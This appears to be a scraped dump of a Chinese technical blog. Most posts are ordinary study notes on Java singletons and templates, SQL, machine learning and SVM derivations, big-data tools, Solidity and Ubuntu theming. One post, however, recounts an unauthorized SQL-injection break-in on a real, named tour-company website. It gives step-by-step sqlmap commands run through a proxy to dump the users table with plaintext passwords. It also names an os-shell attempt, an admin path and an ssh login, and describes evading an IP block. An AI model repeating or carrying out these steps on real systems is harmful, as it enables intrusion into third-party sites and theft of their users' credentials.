因为找最大值需要比较大小 （5）public static &lt;T extends Comparable&lt;? super T&gt;&gt; void sort(List list) 给list集合排序 &lt;T extends Comparable&lt;? super T&gt;&gt;：要求T或T的父类实现Comparable接口 （6）public static Collection synchronizedCollection(Collection c) 以synchronizedXX开头的方法，表示把某种非线程安全集合转为一个线程安全的集合。 （7）public static List unmodifiableList(List&lt;? extends T&gt; list) 以unmodifiableXx开头的方法，表示返回一个“只读”的集合。 第十八章 设计模式18.1 模板设计模式（了解）1、当解决某个问题，或者完成某个功能时，主体的算法结构（步骤）是确定的，只是其中的一个或者几个小的步骤不确定，要有使用者（子类）来确定时，就可以使用模板设计模式 2、示例代码：计算任意一段代码的运行时间 123456789101112131415161718//模板类public abstract class CalTime&#123; public long getTime()&#123; //1、获取开始时间 long start = System.currentTimeMills(); //2、运行xx代码：这个是不确定的 doWork(); //3、获取结束时间 long end = System.currentTimeMills(); //4、计算时间差 return end - start; &#125; protected abstract void doWork();&#125; 使用模板类： 12345public class MyCalTime extends CalTime&#123; protected void doWork()&#123; //....需要计算运行时间的代码 &#125;&#125; 测试类 123456public class Test&#123; public static void main(String[] args)&#123; MyCalTime my = new MyCalTime(); System.out.println(\"运行时间：\" + my.getTime()); &#125;&#125; 18.2 单例设计模式单例：整个系统中，某个类型的对象只有一个。 1、饿汉式 （1）枚举式 123public enum Single&#123; INSTANCE&#125; （2）形式二 123456public class Single&#123; public static final Single INSTANCE = new Single(); private Single()&#123; &#125;&#125; （3）形式三 123456789public class Single&#123; private static final Single INSTANCE = new Single(); private Single()&#123; &#125; public static Single getInstance()&#123; return INSTANCE; &#125;&#125; 2、懒汉式 （1）内部类形式 123456789101112public class Single&#123; private Single()&#123;&#125; private static class Inner&#123; static final Single INSTANCE = new Single(); &#125; public static Single getInstance()&#123; return Inner.INSTANCE; &#125; &#125; （2）形式二 123456789101112131415public class Single&#123; private static Single instance; private Single()&#123;&#125; public static Single getInstance()&#123; if(instance == null)&#123; synchronized(Single.class)&#123; if(instance == null)&#123; instance = new Single(); &#125; &#125; &#125; return instance; &#125;&#125;","categories":[],"tags":[]},{"title":"模型集成策略","slug":"2021-01-12-模型集成","date":"2021-01-11T16:00:00.000Z","updated":"2023-01-01T12:01:31.183Z","comments":true,"path":"2021/01/12/2021-01-12-模型集成/","link":"","permalink":"http://waynamigo.github.io/2021/01/12/2021-01-12-模型集成/","excerpt":"","text":"stacking","categories":[{"name":"ML","slug":"ML","permalink":"http://waynamigo.github.io/categories/ML/"}],"tags":[{"name":"ML","slug":"ML","permalink":"http://waynamigo.github.io/tags/ML/"},{"name":"DL","slug":"DL","permalink":"http://waynamigo.github.io/tags/DL/"},{"name":"stacking","slug":"stacking","permalink":"http://waynamigo.github.io/tags/stacking/"}]},{"title":"数据库系统相关","slug":"2021-01-11-数据库","date":"2021-01-10T16:00:00.000Z","updated":"2022-07-18T12:28:36.718Z","comments":true,"path":"2021/01/11/2021-01-11-数据库/","link":"","permalink":"http://waynamigo.github.io/2021/01/11/2021-01-11-数据库/","excerpt":"关于计算机研究生复试的数据库相关问题（笔试）","text":"关于计算机研究生复试的数据库相关问题（笔试） 系统概念相关数据视图数据抽象： 物理层–&gt;逻辑层–&gt;视图层实例和模式：物理模式–&gt;逻辑模式–&gt;子模式数据集合是实例(Instance)， 数据库总体设计为数据库模式(Schema)数据模型： 关系模型 实体-联系模型（E-R) 基于对象的模型 半结构化数据模型 关系运算域：关系中的某属性允许取值的集合码：整个关系中区分不同元组的一种性质超码 super key：一个或多个属性的集合，唯一标识一个元组,允许有多余的属性候选码 candidate key：允许最少必要属性的超码即候选码比如{ID}{name,seat}是两个候选码主码 primary key：设计者在一个关系内的候选码中选择的区分元组的属性组合主码选择原则：选择那些值从不改变或极少改变的候选码作primary key外码 foreign key：一个关系内的某属性是另一个关系的主码 关系代数 选择元组/属性 σ 投影 π 自然连接 ∞ 笛卡尔积 X 集合运算 交 并 自然连接举例 A B C D B E 1 a 3 2 c 7 2 b 6 3 d 5 3 c 7 1 a 3 * 计算笛卡尔积 * 选出左B=右B的元组，不等的不算，忽略掉 * 合并该元组，成为新元组 A B C D E ，成为新元组的只有两组 1 a 3 1 3 3 c 7 2 7 ## SQL相关 自然连接 nature join 和join using(某个属性) 并运算：union 自动去重 union all 可以保留重复 交运算：intersect 自动去重 intersect all 可保留重复 差运算：except 自动去重 except all 可保留重复 聚集函数：sum, min , max , count , avg分组聚集： group by中没有出现的属性，只要是出现在select中，必须在聚集函数内部的形式出现,比如b,c没出现在group by 内部，用例： 1select a,avg(b),sum(c) from table1 group by a; 集合成员资格：in ,not in集合比较：some运算,用例 123456select ID from instructor where salary &gt;some (select salary from instructor where department = 'bio');等价于select distinct T.ID from instructor as T,instructor as S where S.department ='bio' and T.salary &gt;S.salary; 空关系测试：exists, not exists,测试子查询结果中是否存在元组，用例： 1234567DSC黑书第六版中的，“找出选修了bio系开设的所有课程的学生”（表在官网select S.ID,S.name from student as S where not exists( (select course_id from course where dep_name = 'bio')//找出bio系开设的所有课程 except (select T.course_id from takes as T where S.ID = T.ID) );//找出S.ID选修的所有课程 重复元组存在性测试：unique，测试子查询返回集合是否有重复元组，无则返回true；not unique则相反 1234DSC黑书第六版中的，“找出所有在2019年最多开设一次的课程”select C.course_id from course as Cwhere unique (select S.course_id from section as S where C.course_id =S.course_id and S.year =2019); 标量子查询：子查询只返回包括【单个属性】的【单个元组】，只可以出现在select where having三种子句中 关系代数","categories":[{"name":"其他","slug":"其他","permalink":"http://waynamigo.github.io/categories/其他/"}],"tags":[{"name":"笔试","slug":"笔试","permalink":"http://waynamigo.github.io/tags/笔试/"}]},{"title":"统计学习笔记","slug":"2020-09-12-statics_note","date":"2020-09-10T16:00:00.000Z","updated":"2022-07-16T04:45:11.727Z","comments":true,"path":"2020/09/11/2020-09-12-statics_note/","link":"","permalink":"http://waynamigo.github.io/2020/09/11/2020-09-12-statics_note/","excerpt":"该笔记是对李航统计学习方法和All of Statics做的学习笔记，简单进行相关算法实验，加强理解，查缺补漏等，内容尽量精炼","text":"该笔记是对李航统计学习方法和All of Statics做的学习笔记，简单进行相关算法实验，加强理解，查缺补漏等，内容尽量精炼 概念生成模型与判别模型generative model和discriminative model$（以下分别表示为G和D）$$G\\ $常见的有朴素贝叶斯，隐马尔科夫模型，高斯混合、 LDA、 Restricted Boltzmann Machine等$D\\ $有Kmeans，感知机，决策树，最大熵模型，Logistic回归、SVM、 boosting、条件随机场、神经网络等两者的本质区别及特点：$G\\ $的流程是学习X和Y的联合概率分布$P(x,y)$得出$P(y|x)$最直接的例子就是Naive Bayes，由于生成的结果是联合分布$P(x,y)$，可以计算边缘分布$P(x)$进行异常值检测，若$P(x)$太小，就判定可能不适合这一类样本所代表的数据。$D\\ $的流程是直接由给定的X，Y学习决策函数或$P(y|x)$，是一种黑盒操作，准确率高，可以将允许对问题进行抽象处理，最熟悉的例子就是Neural Network 分类问题和回归问题分类用CrossEntropy，回归用Mean Square Error等等 范数 norm$L1范数 \\sum{|x_i|}$$L2范数 \\sqrt{x_{1}^{2} + x_{2}^{2} + … + x_{n}^{2}}$$L_\\infty无穷范数MAX{|x_i|}$范数理论推论$L1\\geq{L2\\geq{L_\\infty}}$对于numpy的线性代数库，有几种求范数的方法，主要就是求这三种 1np.linalg.norm(x, ord=None, axis=None, keepdims=False) axis=0表示对矩阵x的每一列求范数，axis=1表示对矩阵的每一行求范数， keeptdims=True表示结果保留维度，keepdims=False表示结果不保留维度 最小二乘是解决曲线拟合问题、最小化cost的优化方法，使求得的数据与实际数据之间的误差平方和最小，应用范围非常广泛。$设(x,y)为一组观测量，x=[x_0,x_1,…,x_n]^T,寻找一个函数y=f(x,w)$ ，使$尽可能逼近曲线(x,y),其中w=[w_0,w_1,…,w_n]^T$，为待估计参数，求解使残差函数$$L(y,f(x,w))=\\sum{[y_i-f(x_i,w_i)]^2}$$得到全局最小值的$w$,直观上就是每个点与拟合曲线的欧氏距离的平方和。 与梯度下降的区别：最小二乘法是指对$\\Delta$求导找出函数全局最小的w，梯度下降是先给定一个w（初始化），经过N次梯度下降后找到的使函数局部最小的w。相对的，梯度下降适用于大规模数据，最小二乘适用于较小样本，不过梯度下降的缺点是到最小点的时候收敛速度变、对初始点的选择极为敏感两个方面。 感知机 perceptron属于$Discriminative \\ Model$的线性分类模型，输入是表示一个Instance的特征向量，求出分离特征的超平面，公式表示为：$f(x) = sign(w*x+b)$$\\begin{eqnarray}sign(x)= \\begin{cases}1,&amp;x\\geq{0} \\cr-1 ,&amp;x&lt;0\\end{cases}\\end{eqnarray}$这种perceptron叠起来就相当于是全连接的MLP(Multi-Layer Perceptron) n多个线性函数叠加，对应矩阵运算$W\\cdot x + B$，$W是w权重矩阵，B是bias的列向量，激活函数对应单个感知机的sign函数$ k-近邻 k nearest neighbor还是属于$Discriminative \\ Model$的模型，复杂度为$O(n^2)$，由三个基本要素组成：距离度量、k值、分类规则距离度量，设有向量x1和x2，则：欧氏距离np.sqrt(np.sum(np.square(x1 - x2)))或直接np.linalg.norm(x1-x2)（用numpy的线性代数库求L2范数，但后者较慢）曼哈顿距离np.sum(x1 - x2) 123456789input:px,kreturn:bestx# get N(x):涵盖最近的k个点的邻域，即KListdistList = []for x in X: distList.append(np.sqrt(np.sum(np.square(px - x))))KList = np.argsort(np.array(distList))[:k]# 决策规则I:由KList得出bestx，以类别分类问题为例，选N(x)最多类别为结果X(np.argmax(np.bincount(X(i)))) 如果要求多个最大值索引np.where(a == np.amax(a))[0]，或者np.argwhere(a == np.amax(a)) kd tree存储k维空间数据的树结构，实现如下 12 朴素贝叶斯 Naive Bayes属于$Generative \\ Model$一类，给的是联合分布$P(x,y)$，学过概率论的应该都会，普通的算法实现如下： 1234567891011121314151617181920212223242526272829303132333435input:先验概率分布P__y : P(Y=c)，条件概率分布P_x_y : P(X=x|Y=c)，dim_f:特征维度c_num：分类数目，data:数据list，label:标签list，以[0,1,...,9]为例return:max P#求出先验分布，并对数化，经常使用的对乘法处理的方式P__y = [[(np.sum(label == np.asarray(i)))/(len(label))] \\ for i in range(c_num)]P__y = np.log(P__y)#求出条件分布P_x_y = np.zeros((c_num, dim_f, 2)) #对标记集进行遍历 for i in range(len(label)): #获取当前循环所使用的标记 c = label[i] #获取当前要处理的样本 x = data[i] #对该样本的每一维feature进行遍历 for j in range(dim_f): #先在矩阵中对应位置加1 P_x_y[c][j][x[j]] += 1 for c in range(c_num): for j in range(dim_f): P_x_y0 = P_x_y[c][j][0] P_x_y1 = P_x_y[c][j][1] P_x_y[c][j][0] = np.log((P_x_y0 + 1) / (P_x_y0 + P_x_y1 + 2)) P_x_y[c][j][1] = np.log((P_x_y1 + 1) / (P_x_y0 + P_x_y1 + 2))# pick up最大ProbabilityP = [0] * c_numfor i in range(c_num): for j in range(dim_f): sum += P_x_y[i][j][x[j]] P[i] = sum + P__y[i] res = P.index(np.amax(P)) 决策树 Decision Tree 及剪枝决策树是经常在kaggle以及实际应用中很广泛且有效的算法，决策树通常包括3个步骤:特征选择、构造、剪枝，无内鬼，直接进行一个sklearn.tree的import，sklearn的tree里封装了BaseDecisionTree，在此基础上进一步封装了DecisionTreeClassifier和DecisionTreeRegressor：分类器和回归器，做kaggle是确实好用。 特征选择：特征选择的准则是信息增益（information gain）或信息增益比。$设离散型X的概率分布P(X =x_i)=p_i$$Entropy的定义为H(X)=\\sum{p_i\\log{p_i}}$ 决策树构造ID3各个节点用信息增益H(D)准则选择特征，递归构建决策树。ID3算法的核心是在决策树各个结点上用信息增益选择特征，递归地构建决策树。具体方法是：从根结点（root node）开始，对结点计算所有可能的特征的信息增益， 选择信息增益最大的特征作为结点的特征，由该特征的不同取值建立子结点；再对子结点递归调用该方法，直到所有feature被用完或剩余feature的信息增益很小或少于自己设置的阈值，决策树建立完成，缺点是只生成了树，没有【】容易过拟合。 C4.5各个节点用信息增益比选择特征，递归构建决策树，递归函数流程和ID3一样，只是评估标准换成了H(D|A) CART对回归树用平方最小误差原则，对分类树用基尼指数最小化原则进行特征选择。 剪枝去掉过于细分的叶结点，使其回退到父结点，甚至更高的结点，然后将父结点或更高的结点改为新的叶结点。 但是自己还是得从0实现一个决策树，以后用的时候心里有点B数。数据用colab的sampledata里california_housing那个 12 Logistic Regression熟悉的Logistic回归，以二分类任务为例，就是用sigmoid函数把结果映射到(-1,1)；多分类任务下，将该二分类任务的sigmoid推广到了softmax函数 ，就是我们熟悉的softmax激活函数。$$Sigmoid(z) = \\frac{1}{1+exp(-z)},z=w^T\\cdot x,(alias\\ Sigmoid(z)=h_w(x))$$$$gradient\\ descent:\\Delta = x_i \\cdot y_i - \\frac{np.exp(w\\cdot x_i) * x_i)}{ ( 1 + np.exp(w\\cdot x_i))}then, \\ w=w+lr\\cdot\\Delta$$或者$$LikelihoodFunc:J(w) =-\\frac{1}{m}\\sum\\limits_{i=1}^{m}{[y_ilog(h_w(x_i))+(1-y_i)log(1-h_w(x_i))]}$$ $$partial:\\frac{\\partial J\\left(w \\right)}{\\partial {w}}=\\frac{1}{m}\\sum\\limits_{i=1}^{m}{(h_w(x_i)-{y_i})x_i}$$代码例子 123456789101112131415#gradient descentx = data # feature array,default(n,m), gradient dimension is my = label # result/ ground truthw = np.zeros(x.shape[1])iter_num = 1000lr = 1e-4for one_iter in range(iter_num): for index in len(data): # 下面xiyi赋值是看着方便，实际上用的时候直接用index取list元素 x_i = data[index] y_i = label[index] # 用上面的公式，求partial gradient = x_i*(1/(1+np.exp(np.dot(w,x_i)))-y_i) w+=gradient*lrprint(\"final w:\",w) 最大熵模型 Max Entropy Model复杂度超高，做分类慢的一批，一般用来衡量预测效果的好坏，其实一般也不用。主要是记录一下最大熵模型的思想：将分类等问题作为约束最优化问题，下面的SVM和Adaboost等算法都是采用的约束最优化思想完成的。 支持向量机 Support Vector Machines间隔最大化的学习策略，可形式化为求解凸二次规划问题/正则化的合页损失函数的最小化问题训练数据线性可分，通过硬间隔最大化（hard margin maximization）学习线性可分SVM/硬间隔SVM数据近似线性可分，通过软间隔最大化（soft margin maximization）学习线性SVM/软间隔SVM数据线性不可分时，通过核函数+软间隔最大化，学习非线性SVM：核函数表示将输入从输入空间映射到特征空间得到的特征向量的内积(点乘)，可以抽象成在高维空间里学习一个线性SVM 线性SVM函数间隔、约束最优化问题 函数间隔：对于给定数据和超平面wx+b：关于样本点(x,y)的函数间隔为$\\gamma_f=y(wx+b)$关于数据集的函数间隔为，所有样本点的最小值，$\\gamma_{min}=min(\\gamma_f)$ 几何间隔：归一化函数间隔，在法向量正向的几何间隔为$\\gamma_g=y(\\frac{w}{||w||}\\cdot{x}+\\frac{b}{||w||}),其中||w||是法向量w的L_2范数$两者关系是$\\gamma_f=\\gamma_g*||w||$ 间隔最大化，我们为使SVM分类样本点的置信度更大，需要将超平面关于数据集的几何间隔最大化，即求最大几何间隔的超平面，数学描述为：$$max\\ \\frac{\\gamma_f}{||w||}\\\\ s.t.\\ y(wx+b)\\geq \\gamma_{min}$$由于等式两边在尺度上是一致的，用一下无敌的“不妨设”$\\gamma_f = 1$，那么优化目标为w的L2范数的最小值，即$$max\\ \\frac{\\gamma_f}{||w||}等价于求\\min{\\frac{||w||^2}{2}}\\\\ s.t.\\ y(wx+b)\\geq{1}$$那么这个转化为二次规划的非线性规划如何求解呢？使用拉格朗日对偶性求解对偶问题得到以上问题的解，以这个线性可分问题为例，引入N个拉格朗日乘子，$\\alpha$，对应N维特征和N维法向量w：$$构建拉格朗日函数L(w,b,\\alpha)=\\frac{||w||^2}{2}-\\sum\\limits_{i=1}^N{\\alpha_iy_i(wx_i+b)}+\\sum\\limits_{i=1}^N{\\alpha_i}$$原始问题的对偶问题转化为$\\max\\limits_{\\alpha}\\min\\limits_{w,b}L,下面推导一下$Derivatives:$$\\frac{\\partial{L(w,b,\\alpha)}}{\\partial{w}}=w-\\sum\\limits_{i=1}^N{\\alpha_ix_iy_i}=0\\\\ \\frac{\\partial{L(w,b,\\alpha)}}{\\partial{b}}=\\sum\\limits_{i=1}^N{\\alpha_iy_i}=0$$Then we turn to:$$max:L(w,b,\\alpha)=\\sum\\limits_{i=1}^N{\\alpha_i}-\\frac{1}{2}\\sum\\limits_{i,j=1}^N{y_iy_j\\alpha_i\\alpha_jx_i^Tx_j}\\\\ s.t\\ \\sum\\limits_{i=1}^N{\\alpha_iy_i}=0$$ 这化简为只有拉格朗日乘子alpha的L极大值问题了，到这一步，我们可以直接进行SMO求解（从这里可以直接跳到下一节）于是我们可以引入软间隔的线性SVM，对每个样本点引进一个松弛变量$\\xi\\geq0$，再引进一个惩罚参数C，那么我们的问题由$求min\\frac{||w||^2}{2}转化为min(\\frac{||w||^2}{2}+C\\sum\\limits_{i=1}^N{\\xi_i})$$$L(w,b,\\xi,\\alpha,\\mu)=\\frac{||w||^2}{2}+C\\sum\\limits_{i=1}^N{\\xi_i}-\\sum\\limits_{i=1}^N{\\alpha_iy_i(wx_i+b)}+\\sum\\limits_{i=1}^N{\\alpha_i(1-\\xi_i)}-\\sum\\limits_{i=1}^N{\\mu_i\\xi_i},\\\\s.t.\\ y(wx+b)\\geq1-\\xi,\\xi\\geq0$$Derivatives:$$\\frac{\\partial{L}}{\\partial{w}}=w-\\sum\\limits_{i=1}^N{\\alpha_ix_iy_i}=0\\\\\\frac{\\partial{L}}{\\partial{b}}=-\\sum\\limits_{i=1}^N{\\alpha_iy_i}=0\\\\\\frac{\\partial{L}}{\\partial{\\xi_i}}=C-\\alpha_i-\\mu_i=0$$以上求出关于$w,b,\\xi$的极小后turn to :$$max:L(w,b,\\xi,\\alpha,\\mu)=\\sum\\limits_{i=1}^N{\\alpha_i}-\\frac{1}{2}\\sum\\limits_{i,j=1}^N{y_iy_j\\alpha_i\\alpha_jx_i^Tx_j}\\\\s.t.\\ \\sum\\limits_{i=1}^N{\\alpha_iy_i}=0,\\\\C-\\alpha_i-\\mu_i=0$$由以上结果可以看出，如果将目标函数的max转化为求min(改正负号)，均得到对应的对偶问题，其满足KKT条件，经过求解对偶问题，得出alpha，带入解得w和b，$$w=\\sum\\limits_{i=1}^N{\\alpha_ix_iy_i}\\\\b=y_j-\\sum\\limits_{i=1}^N{}y_i\\alpha_i(x_ix_j)$$即得到超平面，wx+b=0以上两种线性的SVM可以直接由上面的推导将一个求最大间隔的原始问题转化为求一个超平面的对偶问题，进而求得 非线性SVM核函数用来将两个样本点实例$x,z$通过映射函数$\\Phi(x),\\Phi(z)$从输入空间映射到特征空间内，核函数表示为K，即$K(x,z)=\\Phi(x)^T\\Phi(z)$，一般不写出映射函数$\\Phi$，而是在Kernel函数中隐式给出：在这记录一下高斯核Gaussian kernel(radial basis function,RBF kernel):$$K(x,z)=exp(-\\frac{||x-z||^2}{2\\sigma^2})$$和sigmoid核：$$K(x,z)=tanh(ax^Tz+c)\\\\ tanh(b)=\\frac{1-e^{-2b}}{1+e^{-2b}}$$“SVM with a sigmoid kernel is equivalent to a 2-layer perceptron”，一个结论，显式的证明就不用写了，其实在看到拉格朗日乘子alpha时，我们就可以直观的联想到拉格朗日乘子相当于感知机场景下对feature的权重。 序列最小最优化算法，sequential minimal optimization,SMO alg.引入核函数的非线性转化为线性（甚至是可分）的凸二次规划问题：$$\\min\\limits_{\\alpha}:\\frac{1}{2}\\sum\\limits_{i,j=1}^N{y_iy_j\\alpha_i\\alpha_jx_i^Tx_j}-\\sum\\limits_{i=1}^N{\\alpha_i},\\\\s.t.\\ \\sum\\limits_{i=1}^N{\\alpha_iy_i}=0$$非线性引入Gaussian核的SVM实现如下： 1def SVM(): 概念补充supprot vector:线性不可分情况下，对偶问题的解$\\alpha=(a_1,a_2…a_N)^T中a_i对应的样本点(x_i,y_i)就是支持向量。$凸优化问题：设$f:F\\rightarrow{R}为$凸函数，则求$\\min\\limits_{x\\in{F}}{f(x)}为$凸优化问题凸优化有如下几个定理 123凸优化任意局部最优解即全局最优解凸优化最优解集为凸集若函数f为非空凸集上的严格凸函数，且凸优化问题存在全局最优解，那么全局最优解唯一 在条件$f_i(x)\\leq0,1,a_i^T\\cdot x = b_i$最小化$f_0(x)$，凸集指一个集合空间内部两点间连线所覆盖的点都在集合空间内，凸二次规划（convex quadratic programming）指目标函数为凸二次函数，形如$$min f(x)= \\frac{1}{2}x^TQx+C^Tx,\\\\s.t.\\ Ax\\leq{b}，其每一行对应一个约束$$Karush-Kuhn-Tucker condition:$\\alpha_i\\geq{0}\\\\y_i(wx_i+b)\\geq{1}\\\\\\alpha_i(y_i(w_ix+b)-1)=0$ 随机森林，梯度提升决策树梯度提升决策树（GBDT）对于输入的一个样本实例，首先会赋予一个初值，然后会遍历每一棵决策树，每棵树都会对预测值进行调整修正，最后得到预测的结果 随机森林减少模型方差，提高性能GBDT减少模型偏差，提高性能","categories":[{"name":"数学","slug":"数学","permalink":"http://waynamigo.github.io/categories/数学/"}],"tags":[{"name":"ML","slug":"ML","permalink":"http://waynamigo.github.io/tags/ML/"},{"name":"数学","slug":"数学","permalink":"http://waynamigo.github.io/tags/数学/"}]},{"title":"云计算技术栈学习路线","slug":"2020-01-04-云计算技术栈","date":"2020-01-03T16:00:00.000Z","updated":"2023-01-04T06:27:40.419Z","comments":true,"path":"2020/01/04/2020-01-04-云计算技术栈/","link":"","permalink":"http://waynamigo.github.io/2020/01/04/2020-01-04-云计算技术栈/","excerpt":"，忘记从哪复制过来的了，侵删（","text":"，忘记从哪复制过来的了，侵删（ Google 三件套Hadoop对应于Google三件套HDFS对应于GFS，即分布式文件系统，MapReduce即并行计算框架，HBase对应于BigTable，即分布式NoSQL列数据库，外加Zookeeper对应于Chubby，即分布式锁设施。 hadoop -&gt;zookeeper -&gt;hive -&gt;flume &amp;&amp; sqoop -&gt;azkaban &amp;&amp; oozie -&gt;数仓建模理论+实践（离线数仓项目） -&gt;hbase -&gt;redis -&gt;kafka -&gt;elk -&gt;scala -&gt;spark -&gt;kylin -&gt;flink -&gt;实时数仓项目 Scala底层也是使用的JVM虚拟机 Hadoop（重点）学习Hadoop，需要重点掌握Hadoop的三个组件：MapReduce、HDFS、YarnZookeeper（会用，懂原理） Zookeeper意为动物园管理者，是一个分布式应用程序协调框架，负责协调大数据框架的 Hive（重点）Hive底层依赖Hadoop，所以学完Hadoop在学Hive很简单，因为Hive是数仓工具，使用SQL开发的，如果懂SQL语句，那Hive学起来更简单了 Flume（会用）Flume就是一个采集工具，比如把日志实时采集到大数据平台上，用Flume即可 Sqoop（会用）Sqoop也是采集工具，但是和Flume定位不同，Sqoop是hadoop和其他数据库之间移动数据Flume是从各种来源收集数据，例如日志，jms，目录等 azkaban和oozie（会用）这两个框架属于一类，都是资源调度框架，比如每天定时跑一些大数据的任务，就可以在这上面操作，这两个框架区别就是azkaban功能简单，易上手，oozie功能多，上手相对复杂一点 数仓理论+实践（重点）学到这可以做一些项目了，找一些离线数仓的项目做下，做项目的同时需要理解数仓建模的理论，数仓为什么这样建，有什么好处，以后可能会出现什么隐患等，需要重点关注 HBase（重点）HBase是一个分布式列式数据库，适合存储海量的数据，能进行秒级查询，需要重点学习 Kafka（重点）Kafka是大数据消息队列领域唯一的王者，不但工作常用，面试也常问，需要理解底层原理ELK（会用，最好也深入下） ELK是三个组件的简称，它们是Elasticsearch、Logstash、Kibana，Elasticsearch 是一个基于 Lucene 的、支持全文索引的分布式存储和索引引擎；Logstash是一个日志收集、过滤、转发的中间件；Kibana是一个可视化工具，主要负责查询 Elasticsearch 的数据并以可视化的方式展现给业务方 Scala（重点）前面也说了，这是大数据必学的一门语言，因为Spark和Flink底层都是基于Scala开发的，当然也有部门Java开发的 Spark（重点）Spark 是专为大规模数据处理而设计的快速通用的计算引擎，支持批处理和流处理，目前主要用在批处理领域 Kylin（会用）Kylin的出现就是为了解决大数据系统中TB级别数据的数据分析需求，它提供Hadoop/Spark之上的SQL查询接口及多维分析(OLAP)能力以支持超大规模数据，它能在亚秒内查询巨大的Hive表。其核心是预计算，计算结果存在HBase中 Flink（重点）Flink目前非常火，和Spark一样，支持批处理和流处理，目前主要用在流处理实时数仓项目（重点）","categories":[{"name":"CloudComputing","slug":"CloudComputing","permalink":"http://waynamigo.github.io/categories/CloudComputing/"}],"tags":[{"name":"CloudComputing","slug":"CloudComputing","permalink":"http://waynamigo.github.io/tags/CloudComputing/"}]},{"title":"Solidity编写smart contract的demo","slug":"2019-07-22-blockchain","date":"2019-07-21T16:00:00.000Z","updated":"2022-07-16T04:45:11.372Z","comments":true,"path":"2019/07/22/2019-07-22-blockchain/","link":"","permalink":"http://waynamigo.github.io/2019/07/22/2019-07-22-blockchain/","excerpt":"暑假开始的区块链+深度学习的小项目，关于写smart contract的阶段性记录(持续更新)ps:清收藏夹时发现的奇异AI社区，地址失效了，现在是http://talk.strangeai.pro（早期是将人工智能算法以平台的形式提供给普通开发者，让开发者来贡献、提交开源或者自有的算法。现在名字改成ManaAI了，开放的算法代码也下架了,遗憾）","text":"暑假开始的区块链+深度学习的小项目，关于写smart contract的阶段性记录(持续更新)ps:清收藏夹时发现的奇异AI社区，地址失效了，现在是http://talk.strangeai.pro（早期是将人工智能算法以平台的形式提供给普通开发者，让开发者来贡献、提交开源或者自有的算法。现在名字改成ManaAI了，开放的算法代码也下架了,遗憾） eth文档solidity文档 测试网络RinkebyRinkeby是以太坊官方提供的测试网络，使用PoA共识机制PoA流程 12345678910111213创世块中指定一组初始授权的signers,所有地址保存在创世区块(Genesis Block),并且把该区块的hash写到钱包里。启动挖矿后, 该组signers开始对生成的block进行签名并广播签名结果保存在区块头的Extra字段中Extra中更新当前高度已授权的所有signers的地址,因为有新加入或踢出的signer每一高度都有一个signer处于IN-TURN状态, 其他signer处于OUT-OF-TURN状态, IN-TURN的signer签名的block会立即广播, OUT-OF-TURN的signer签名的block会延时一段时间后再广播, 保证IN-TURN的签名block有更高的优先级上链如果需要加入一个新的signer,signer通过API接口发起一个proposal, 该proposal通过复用区块头 Coinbase(新signer地址)和Nonce(&quot;0xffffffffffffffff&quot;) 字段广播给其他节点. 所有已授权的signers对该新的signer进行&quot;加入&quot;投票, 如果赞成票超过signers总数的50%, 表示同意加入如果需要踢出一个旧的signer, 所有已授权的signers对该旧的signer进行&quot;踢出&quot;投票, 如果赞成票超过signers总数的50%, 表示同意踢出 Soliditycode请稍等","categories":[{"name":"Solidity","slug":"Solidity","permalink":"http://waynamigo.github.io/categories/Solidity/"}],"tags":[{"name":"paper","slug":"paper","permalink":"http://waynamigo.github.io/tags/paper/"},{"name":"ML","slug":"ML","permalink":"http://waynamigo.github.io/tags/ML/"},{"name":"blockchain","slug":"blockchain","permalink":"http://waynamigo.github.io/tags/blockchain/"},{"name":"Solidity","slug":"Solidity","permalink":"http://waynamigo.github.io/tags/Solidity/"}]},{"title":"sqlmap注入拿后台","slug":"2019-07-15-sqlmap-1","date":"2019-07-14T16:00:00.000Z","updated":"2022-07-16T04:45:11.532Z","comments":true,"path":"2019/07/15/2019-07-15-sqlmap-1/","link":"","permalink":"http://waynamigo.github.io/2019/07/15/2019-07-15-sqlmap-1/","excerpt":"本文过程中无破坏性操作对于这种php的无防站，直接用sqlmap+msf就可以拿。对于那些暴露参数的php站的可以直接拿库，刚刚随便找了个。2019-07-16:被发现了。。ip被黑名单，于是换了个节点。。。还可以登录","text":"本文过程中无破坏性操作对于这种php的无防站，直接用sqlmap+msf就可以拿。对于那些暴露参数的php站的可以直接拿库，刚刚随便找了个。2019-07-16:被发现了。。ip被黑名单，于是换了个节点。。。还可以登录 先找后台（这位老哥直接在右上角放了链接）http://hesselgravetours.com/event.php?tourID=1721 check databases1sqlmap -u http://****tours.com/event.php?tourID=1721 --dbs --proxy socks5://127.0.0.1:1080 --random-agent check tables1sqlmap -u http://****tours.com/event.php?tourID=1721 -D hesselgrave --tables --proxy socks5://127.0.0.1:1080 --random-agent check columns1sqlmap -u http://****tours.com/event.php?tourID=1721 -D hesselgrave -T users --columns --proxy socks5://127.0.0.1:1080 --random-agent dump 1sqlmap -u http://****tours.com/event.php?tourID=1721 -D hesselgrave -T users -C username,userID,password,accesslevel --dump --proxy socks5://127.0.0.1:1080 --random-agent 可见没经过加密。。如果经过了简单加密的话（如mysql的md5(passwd)），就可以找个在线网站撞（比如https://www.cmd5.com/） 后续不贴了。防御太低有好几种方法找到路进行提权 因为在前面已经得到系统是FreeBSD或者是其他linux，并且得到网站运行在的用户名是content，懂我意思吧 继续用sqlmap –os-shell提权，第一次没有找到上传点 后台找到这个admin/documents/clients_recordview.php 插 入 服 务 器提示是：ssh -o HostKeyAlgorithms=+ssh-dss content@hesselgravetours.com 密码是***图片不贴了 明天读一下https://arxiv.org/pdf/1502.01852.pdf","categories":[{"name":"渗透","slug":"渗透","permalink":"http://waynamigo.github.io/categories/渗透/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://waynamigo.github.io/tags/Linux/"},{"name":"web","slug":"web","permalink":"http://waynamigo.github.io/tags/web/"},{"name":"sqlmap","slug":"sqlmap","permalink":"http://waynamigo.github.io/tags/sqlmap/"},{"name":"msf","slug":"msf","permalink":"http://waynamigo.github.io/tags/msf/"}]},{"title":"部分MACOS风格的ubuntu","slug":"2019-07-09-我的ubuntu设置界面风格","date":"2019-07-08T16:00:00.000Z","updated":"2022-07-16T04:45:11.278Z","comments":true,"path":"2019/07/09/2019-07-09-我的ubuntu设置界面风格/","link":"","permalink":"http://waynamigo.github.io/2019/07/09/2019-07-09-我的ubuntu设置界面风格/","excerpt":"记录一下以防以后电脑崩了还得重新配,感觉撑不住了","text":"记录一下以防以后电脑崩了还得重新配,感觉撑不住了 效果这样 123456789101112sudo apt-get install gnome-tweak-tool#extensions.gnome.org install [ User themes] #www.gnome-look.org [ gtk-3 themes:McOS-HS]tar -zxvf 